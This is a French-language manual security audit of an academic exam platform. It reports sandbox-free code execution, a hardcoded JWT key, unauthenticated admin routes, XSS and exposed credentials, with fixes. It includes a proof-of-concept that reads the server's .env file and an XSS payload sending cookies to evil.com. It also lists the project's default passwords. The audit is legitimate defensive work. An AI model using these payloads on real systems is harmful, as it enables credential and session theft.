# Rapport d'Audit de Sécurité — PEAN Platform

**Date :** 2026-06-13  
**Cible :** PEAN (Plateforme d'Évaluation Académique Numérique)  
**Stack :** FastAPI (Python) + React (TypeScript) + PostgreSQL + MinIO  
**Type d'audit :** Revue de code manuelle complète

---

## Résumé

| Domaine | Niveau de Risque | Findings |
|---|---|---|
| 🔴 Code Execution (Judge) | **CRITIQUE** | 3 |
| 🔴 Backend API | **ÉLEVÉ** | 4 |
| 🟡 Frontend | **MOYEN** | 3 |
| 🟡 Infrastructure & Config | **MOYEN** | 3 |
| 🟢 Dépendances | **FAIBLE** | 1 |

---

## 🔴 FINDING CR-01 : Code Execution — Injection système totale (CRITIQUE)

**Fichier :** `server/services/code_executor.py` (lignes 1-452)  
**CVE-like :** PEAN-2026-001

### Description
Le service `CodeExecutor` exécute du code étudiant arbitraire via `subprocess.run()` **directement sur le serveur hôte**, sans isolation par conteneur. Les langages supportés incluent Python, JavaScript, Java, C++, Rust, Go, Bash, PHP, Ruby, R, et SQLite — tous exécutés en processus natif.

### Impact
Un étudiant peut:
- **Exécuter des commandes système arbitraires** via `os.system()`, `subprocess.run()`, `__import__('os').system()` dans n'importe quel langage
- **Lire/modifier tous les fichiers du serveur** (dont `.env`, la base de données, les copies des autres étudiants)
- **Accéder au réseau interne** (PostgreSQL en `localhost:5432`, Redis en `localhost:6379`, MinIO en `localhost:9000`)
- **Extraire les tokens JWT, clés API IA, credentials cloud**
- **Exécuter un ransomware ou miner de la cryptomonnaie** sur l'infrastructure

### Preuve de concept
```python
# Un étudiant peut soumettre ce code via /api/judge/run
import subprocess
result = subprocess.run(["cat", "/app/.env"], capture_output=True, text=True)
# Le fichier .env avec JWT_SECRET_KEY et autres secrets est retourné dans stdout
```

### Recommandation
- **REMISER CE CODE** en l'état — ne jamais déployer en production sans Judge0/Docker
- Remplacer par un service d'exécution isolé (Judge0, Docker-in-Docker, gVisor)
- Le commentaire en ligne 3 (« Pour la production, remplacer par Judge0 (conteneurs Docker) ») confirme que l'équipe est consciente du problème — mettre en œuvre cette migration **avant tout déploiement**
- Ajouter un **blocage réseau** (`iptables`/`nsjail`) si exécution directe temporaire

---

## 🔴 FINDING CR-02 : Code execution — Pas d'authentification vérifiée sur /api/judge (CRITIQUE)

**Fichier :** `server/api/judge/router.py` (lignes 38-83)

### Description
Les endpoints `/api/judge/run` et `/api/judge/submit` utilisent `verify_student_session()` qui vérifie seulement que le `session_code` et le `student_number` sont valides. **N'importe qui** connaissant un code de session (généralement 8 caractères hex) et un numéro étudiant peut exécuter du code.

### Impact
- Permet l'exécution de code arbitraire sans authentification forte
- Le `access_code` de la session est accessible aux étudiants (ils l'utilisent pour rejoindre)
- Pas de rate limiting sur l'exécution

### Recommandation
- Ajouter un rate limiting strict sur `/api/judge/run` et `/api/judge/submit`
- Ajouter une authentification par token de session étudiant (généré lors du `join`)
- Limiter le nombre d'exécutions par étudiant par minute

---

## 🔴 FINDING CR-03 : Code execution — Pas de sandboxing mémoire/processus (CRITIQUE)

**Fichier :** `server/services/code_executor.py` (lignes 123-138)

### Description
La limitation mémoire via `resource.setrlimit()` est placée dans `preexec_fn` mais :
1. **Ne fonctionne pas sur Windows** (le `try/except` l'ignore silencieusement)
2. Pas de limitation du **nombre de processus** enfants (fork bomb possible)
3. Pas de limitation du **temps CPU** (seulement temps réel)
4. Pas de limite du **nombre de fichiers ouverts**

### Recommandation
- Utiliser `resource.RLIMIT_NPROC`, `resource.RLIMIT_FSIZE`, `resource.RLIMIT_CPU`
- Sur Windows, utiliser des mécanismes équivalents (Job Objects)
- Déployer en conteneur avec Docker (la seule vraie solution)

---

## 🔴 FINDING API-01 : Clé JWT secrète codée en dur dans la config (HAUT)

**Fichiers :** `server/core/config.py:29`, `docker-compose.yml:19`, `.env:10`

### Description
La clé JWT est codée en dur avec des valeurs triviales :
- Config par défaut : `"changez-moi-en-production-svp"`
- Docker Compose : `"changez-moi-en-production-svp"`
- `.env` : `"dev-key-pean-2026-a-changer-en-prod"`

### Impact
- N'importe qui peut forger des tokens JWT valides et usurper l'identité de **n'importe quel enseignant** (y compris l'admin)
- Accès total à toutes les fonctionnalités enseignants (création de sessions, correction, résultats)
- Un token forgé en `"sub": "1"` donne accès au premier enseignant en base

### Recommandation
- **URGENT :** Générer une clé aléatoire de 256 bits (HS256) via `openssl rand -hex 32`
- Ne jamais commit de clé JWT (même de développement)
- Utiliser une variable d'environnement **sans valeur par défaut** dans Settings
- Ajouter un check : `if "changez" in JWT_SECRET_KEY: raise RuntimeError(...)` au démarrage

---

## 🔴 FINDING API-02 : Admin endpoints sans authentification (HAUT)

**Fichier :** `server/api/admin/router.py` (lignes 1-163)

### Description
Tous les endpoints admin (`/api/admin/*`) **n'ont pas de dépendance d'authentification**. Pas de `Depends(get_current_teacher)`, pas de vérification de rôle admin.

### Routes exposées sans aucun contrôle :
- `GET /api/admin/stats` — Statistiques globales
- `GET /api/admin/teachers` — Liste tous les enseignants (email, nom, institution)
- `GET /api/admin/teachers/{id}` — Détail complet d'un enseignant
- `GET /api/admin/sessions` — Liste toutes les sessions avec codes d'accès
- `GET /api/admin/incidents` — Tous les incidents de sécurité

### Impact
- N'importe qui peut lister tous les utilisateurs, sessions, et incidents
- Les **codes d'accès aux sessions** sont exposés (`access_code`)
- Pas de rate limiting sur ces endpoints
- Fuite massive de données personnelles (noms, emails, institutions)

### Recommandation
- Ajouter `Depends(get_current_teacher)` avec vérification de rôle admin
- Créer un vrai système de rôles (au lieu du check `email == 'admin@pean.edu'` côté frontend)

---

## 🔴 FINDING API-03 : Student submit — Paramètres non authentifiés (HAUT)

**Fichier :** `server/api/students/router.py` (lignes 110-153)

### Description
L'endpoint `POST /api/student/submit` utilise `session_code`, `student_number`, **et** `student_name` comme paramètres de requête. Un étudiant malveillant peut :
1. Soumettre une copie **au nom d'un autre étudiant** en modifiant `student_number`
2. Modifier `student_name` pour usurper l'identité

### Impact
- Usurpation de soumission entre étudiants
- Un étudiant peut soumettre une copie vide au nom de ses camarades pour les piéger
- Pas de signature de la soumission côté client

### Recommandation
- Lier l'identité de l'étudiant à un token généré lors du `join_session()` (stocké en cache Redis ou JWT)
- Valider que `student_number` dans le paramètre correspond à celui du student_hash
- Ajouter un nonce / timestamp dans la soumission pour éviter les rejeux

---

## 🔴 FINDING API-04 : Forget/Reset password — Non implémenté mais endpoints exposés (MOYEN)

**Fichiers :** `server/api/auth/router.py`, `server/schemas/auth.py`

### Description
Les endpoints `POST /api/auth/forgot-password` et `POST /api/auth/reset-password` sont définis dans le client (`api.ts`), et les schémas existent, mais ils ne sont **pas implémentés côté serveur** dans le routeur d'authentification. Si un étudiant ou attaquant tente d'utiliser ces endpoints, soit une 405/404 sera retournée, soit ils pourraient exposer une fonctionnalité non sécurisée.

---

## 🟡 FINDING FE-01 : XSS dans le rendu Markdown (MOYEN)

**Fichier :** `client/src/components/RichEditor.tsx` (lignes 139-177)

### Description
Le mode lecture utilise `dangerouslySetInnerHTML` (ligne 143) avec un rendu markdown maison. Bien que la fonction `renderMarkdown()` échappe `&`, `<`, et `>` (lignes 163-165), la fonction `insertTag()` (lignes 49-63) **permet d'insérer du HTML brut** via les boutons `<u>` et `</u>`.

### Impact
Un étudiant malveillant peut injecter du HTML/JS dans sa copie :
```html
<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
```
Si un enseignant consulte la copie en mode lecture, le script s'exécute.

### Recommandation
- **Ne pas utiliser `dangerouslySetInnerHTML`** — utiliser un rendeur DOM sécurisé (DOMPurify)
- Avant d'afficher, passer le contenu par DOMPurify : `DOMPurify.sanitize(content)`
- Supprimer les balises `<script>`, `onerror`, `onload` du rendu
- Alternative : rendre en Markdown côté serveur (Python) avec une bibliothèque safe

---

## 🟡 FINDING FE-02 : Token stocké dans localStorage (MOYEN)

**Fichier :** `client/src/services/api.ts` (lignes 13, 31-35)

### Description
Les tokens JWT sont stockés dans `localStorage`, ce qui les rend accessibles à **toute extension de navigateur** et à toute XSS. En cas de XSS, l'attaquant peut lire `localStorage.getItem('pean_access_token')`.

### Recommandation
- Utiliser des **cookies HttpOnly + Secure + SameSite=Strict** pour les tokens
- Ou stocker le refresh token en cookie httpOnly et l'access token en mémoire (Zustand store)
- Ajouter un flag `Secure` et `SameSite` si cookies utilisés

---

## 🟡 FINDING FE-03 : Vérification admin côté client uniquement (MOYEN)

**Fichier :** `client/src/components/AuthGuard.tsx` (ligne 24)

### Description
Le check admin est fait **exclusivement côté frontend** en comparant l'email à `'admin@pean.edu'`. Il n'y a pas de mécanisme côté serveur pour empêcher un enseignant non-admin d'accéder aux routes admin.

### Recommandation
- Déplacer la vérification du rôle admin sur le backend (dans les dépendances FastAPI)
- Ajouter un champ `role` dans le modèle `Teacher` (admin, teacher)

---

## 🟡 FINDING INFRA-01 : CORS trop permissif (FAIBLE)

**Fichier :** `server/main.py` (lignes 32-38)

### Description
Le middleware CORS utilise `allow_credentials=True` avec `allow_origins` qui est une liste fixe. Ce n'est pas un problème immédiat car les origines sont spécifiques, mais l'utilisation de credentials CORS avec une origine dynamique ou un wildcard (`*`) serait dangereuse.

---

## 🟡 FINDING INFRA-02 : MinIO en mode non sécurisé (MOYEN)

**Fichier :** `server/services/storage.py` (ligne 25)

### Description
MinIO est configuré avec `secure=False`. En production, cela signifie que les fichiers (épreuves, copies, avatars) transitent en **clair** sur le réseau. Aussi, les credentials MinIO sont codés en dur dans le `.env`.

---

## 🟡 FINDING INFRA-03 : Credentials faibles dans Docker Compose (MOYEN)

**Fichiers :** `docker-compose.yml`

### Description
Identifiants faibles ou codés en dur :
- PostgreSQL : `pean` / `pean_pass` (ligne 33-34)
- MinIO : `pean_admin` / `minio_secret_pean` (ligne 69-70)
- JWT : `changez-moi-en-production-svp` (ligne 19)

Ces credentials sont exposés dans le dépôt Git et dans le fichier `docker-compose.yml`.

---

## 🟢 FINDING DEP-01 : Dépendances frontend récentes (OK)

**Fichier :** `client/package.json`

Les dépendances sont récentes (React 19, Axios 1.7, Zustand 5, Vite 6). Pas de vulnérabilités connues sur les versions utilisées. **Recommandation :** ajouter `npm audit` dans la CI.

## 🟢 FINDING DEP-02 : Dépendances backend stables (OK)

**Fichier :** `server/requirements.txt`

Toutes les dépendances Python sont en versions fixes. FastAPI 0.115, SQLAlchemy 2.0, python-jose 3.3, passlib 1.7 avec bcrypt. **Recommandation :** ajouter `pip-audit` ou `safety check` dans la CI.

---

## Points Positifs

✅ **Password hashing :** Utilisation de bcrypt via `passlib` (bonne pratique)  
✅ **Login lockout :** Comptes verrouillés après 5 tentatives échouées (15 min)  
✅ **Token types :** Séparation access_token / refresh_token avec type "access" et "refresh"  
✅ **Owner vérification :** La plupart des endpoints teachers/sessions vérifient le propriétaire  
✅ **Kiosk mode :** Détection des sorties de plein écran, copie interdite pendant l'examen  
✅ **Hash étudiant :** Utilisation de SHA-256 pour identifier les étudiants sans stocker leur numéro en clair  
✅ **File upload :** Vérification d'extension avant upload  
✅ **Rate limiting configuré :** `MAX_LOGIN_ATTEMPTS` est défini  

---

## Roadmap Corrective (Prioritaire)

### 🔴 Immédiat (avant déploiement)
1. **CRITIQUE :** Désactiver `/api/judge/run` et `/api/judge/submit` ou les isoler avec Docker
2. **HAUT :** Générer une vraie clé JWT — supprimer la valeur par défaut
3. **HAUT :** Ajouter `Depends(get_current_teacher)` sur tous les endpoints admin
4. **HAUT :** Authentifier les soumissions étudiantes avec un token de session

### 🟡 Court terme (1-2 semaines)
5. **MOYEN :** Nettoyer le HTML avant rendu frontend (DOMPurify)
6. **MOYEN :** Migrer les tokens JWT du localStorage vers des cookies HttpOnly
7. **MOYEN :** Renforcer les credentials Docker Compose
8. **MOYEN :** Ajouter un système de rôles backend (admin/teacher)

### 🟢 Moyen terme (1 mois)
9. **MOYEN :** Implémenter Judge0 / conteneurisation du code executor
10. **FAIBLE :** Rate limiting sur tous les endpoints sensibles
11. **FAIBLE :** Ajouter `pip-audit` et `npm audit` dans la CI
12. **FAIBLE :** Audit de sécurité automatisé (Semgrep) dans le pipeline CI/CD

---

## Fichiers audités (22 fichiers)

| Fichier | Lignes | Rôle |
|---|---|---|
| `server/core/security.py` | 54 | JWT, Hashing |
| `server/core/config.py` | 64 | Configuration |
| `server/core/database.py` | 37 | Base de données |
| `server/core/dependencies.py` | 115 | Auth dépendances |
| `server/main.py` | 65 | Entry point |
| `server/api/auth/router.py` | 180 | Auth routes |
| `server/api/admin/router.py` | 163 | Admin routes |
| `server/api/students/router.py` | 215 | Student routes |
| `server/api/judge/router.py` | 84 | Code execution routes |
| `server/api/teachers/router.py` | 32 | Teacher routes |
| `server/api/sessions/router.py` | 158 | Session routes |
| `server/api/exams/router.py` | 167 | Exam routes |
| `server/api/grading/router.py` | 291 | Grading routes |
| `server/services/code_executor.py` | 452 | **Code execution (CRITIQUE)** |
| `server/services/student.py` | 126 | Student service |
| `server/services/correction_ai.py` | 286 | AI correction |
| `server/services/storage.py` | 119 | MinIO storage |
| `client/src/services/api.ts` | 103 | API client |
| `client/src/components/AuthGuard.tsx` | 30 | Auth guard |
| `client/src/components/KioskMode.tsx` | 141 | Kiosk mode |
| `client/src/components/RichEditor.tsx` | 178 | Rich text editor |
| `docker-compose.yml` | 101 | Docker config |

---

*Rapport généré manuellement par revue de code complète le 2026-06-13.*
